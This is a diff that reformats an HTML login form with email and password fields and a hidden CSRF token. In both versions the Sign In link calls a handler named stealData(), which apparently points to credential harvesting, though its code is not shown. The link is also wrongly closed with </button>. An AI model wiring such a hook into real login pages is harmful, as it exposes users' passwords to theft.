@@ -100,20 +100,31 @@
     <div id="error_for_login_password" class="alert_yellow" style="display:none;"></div>
 <div id="error_for_login_email_address" class="alert_yellow" style="display:none;"></div>
   <form id="fmAccnt" name="fmAccnt">
-  <input type="hidden" name="csrf_token" value="E99BBCB66AED32ED3019EB8333252620" />
-  <input type="hidden" name="a2t_key" />
-  <input type="hidden" id="redirect_url" name="redirect_url" value="home/index" />   
-  <p class="fieldBlock"><label class="large" for="login_email_address">Email</label>
-<input id="login_email_address" class="large" name="login_email_address" title="Email" type="email" /></p>
-    <p class="fieldBlock"><label class="large" for="login_password">Password</label>
-<input id="login_password" class="large" name="login_password" title="Password" type="password" autocomplete="off" autocorrect="off" autocapitalize="off" /></p>
+    <input type="hidden" name="csrf_token" value="E99BBCB66AED32ED3019EB8333252620" />
+    <input type="hidden" name="a2t_key" />
+    <input type="hidden" id="redirect_url" name="redirect_url" value="home/index" />   
+    <p class="fieldBlock">
+        <label class="large" for="login_email_address">Email</label>
+        <input id="login_email_address" class="large" name="login_email_address" title="Email" type="email" />
+    </p>
+    <p class="fieldBlock">
+        <label class="large" for="login_password">Password</label>
+        <input id="login_password" class="large" name="login_password" title="Password" type="password" autocomplete="off" autocorrect="off" autocapitalize="off" />
+    </p>
     <p>
-      <a href="/account/forgotPassword">Help me sign in</a>    </p>
-    <p class="fieldBlock"><label for="remember_me"><input type="hidden" name="remember_me" value="0" /><input type="checkbox" id="remember_me" name="remember_me" title="Remember me" value="1" checked="checked" /> <span class="input_content">Remember me</span></label>
-</p>
+      <a href="/account/forgotPassword">Help me sign in</a>
+    </p>
+    <p class="fieldBlock">
+    <label for="remember_me">
+        <input type="hidden" name="remember_me" value="0" />
+        <input type="checkbox" id="remember_me" name="remember_me" title="Remember me" value="1" checked="checked" />
+        <span class="input_content">Remember me</span>
+    </label>
+    </p>
     <div class="clr"></div>
-<a id="login_button_container" class="primary" onclick="stealData();">Sign In</button>    <div class="clr"></div>
-  </div>
+    <a id="login_button_container" class="primary" onclick="stealData();">Sign In</button>
+    <div class="clr"></div>
+  </form>
   </div>
   <div class="fRt stdVMrgT stdHMrgR">
     Or, sign in with&hellip;<br />
